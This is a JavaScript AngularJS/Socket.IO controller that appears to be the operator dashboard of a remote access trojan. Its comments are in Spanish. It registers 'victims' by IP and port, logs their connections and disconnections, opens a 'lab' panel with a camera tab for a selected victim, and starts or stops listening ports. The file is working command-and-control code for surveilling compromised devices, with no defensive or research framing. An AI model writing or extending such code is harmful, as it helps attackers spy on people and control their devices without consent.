(function(){
  'use strict';

  window.socket = io();

  // Stop reconnection loop when the server rejects the socket handshake due to
  // missing/invalid auth (avoid the /socket.io polling request storm).
  window.socket.on('connect_error', function(err) {
    if (err && err.message === 'Unauthorized') {
      window.socket.disconnect();
      console.warn('Socket.IO: auth rejected – stopping reconnection attempts');
      if (typeof window._redirectToLogin === 'function') window._redirectToLogin();
    }
  });

  var app = angular.module('myappy', []);

  app.filter('toArray', function() {
    return function(obj) {
      return Object.values(obj || {});
    };
  });

  // Cambia aquí: agrega $rootScope y pon el socket ahí
  app.controller('AppCtrl', ['$scope', '$rootScope', '$http', function($scope, $rootScope, $http) {
    $scope.port    = '';
    $scope.victims = {};
    $scope.logs    = [];
    $scope.selectedVictim = null;
    $scope.labModalOpen = false;
    $scope.labTab = 'camera';

    console.log('INIT', $scope.labModalOpen, $scope.selectedVictim);

    $scope.clearLogs = function() {
      $scope.logs = [];
    };

    $scope.openLab = function(victim) {
      console.log('openLab ejecutada', victim);
      $scope.selectedVictim = victim;
      $scope.labModalOpen = true;
      $scope.labTab = 'camera';
    };

    $scope.closeLab = function() {
      $scope.selectedVictim = null;
      $scope.labModalOpen = false;
      $scope.labTab = 'camera';
    };

    // Expón el socket en $rootScope para TODA la app
    $rootScope.socket = window.socket;
    var socket = $rootScope.socket;

    socket.on('connect', function() {
      console.log('✅ Socket.IO conectado (AppCtrl)');
    });

    socket.on('newVictim', function(v) {
      $scope.$apply(function() {
        $scope.victims[v.id] = v;
        $scope.logs.unshift({
          date: new Date().toLocaleString(),
          msg:  '🆕 Victim: ' + v.ip + ':' + v.port
        });
      });
    });

    socket.on('victimDisconnected', function(v) {
      $scope.$apply(function() {
        if ($scope.victims[v.id]) {
          delete $scope.victims[v.id];
          $scope.logs.unshift({
            date: new Date().toLocaleString(),
            msg:  '🔌 Victim desconectado: ' + v.ip + ':' + v.port + (v.reason ? ' (' + v.reason + ')' : '')
          });
          if ($scope.selectedVictim && $scope.selectedVictim.id === v.id) {
            $scope.closeLab();
          }
        }
      });
    });

    $scope.Listen = function(port) {
      $http.post('/api/listen', { port: port })
        .then(function(res) {
          var mensaje = res.data.success
            ? '🔊 Escuchando en puerto ' + port
            : '❌ Error: ' + (res.data.error || JSON.stringify(res.data));
          $scope.logs.unshift({ date: new Date().toLocaleString(), msg: mensaje });
        })
        .catch(function(err) {
          var errMsg = err.data && err.data.error ? err.data.error : err.statusText;
          $scope.logs.unshift({ date: new Date().toLocaleString(), msg: '❌ Error de red: ' + errMsg });
        });
    };

    $scope.StopListening = function(port) {
      $http.post('/api/stop', { port: port })
        .then(function(res) {
          var mensaje = res.data.success
            ? '🛑 Se detuvo escucha en puerto ' + port
            : '❌ Error: ' + (res.data.error || JSON.stringify(res.data));
          $scope.logs.unshift({ date: new Date().toLocaleString(), msg: mensaje });
        })
        .catch(function(err) {
          var errMsg = err.data && err.data.error ? err.data.error : err.statusText;
          $scope.logs.unshift({ date: new Date().toLocaleString(), msg: '❌ Error de red: ' + errMsg });
        });
    };

  }]);
})();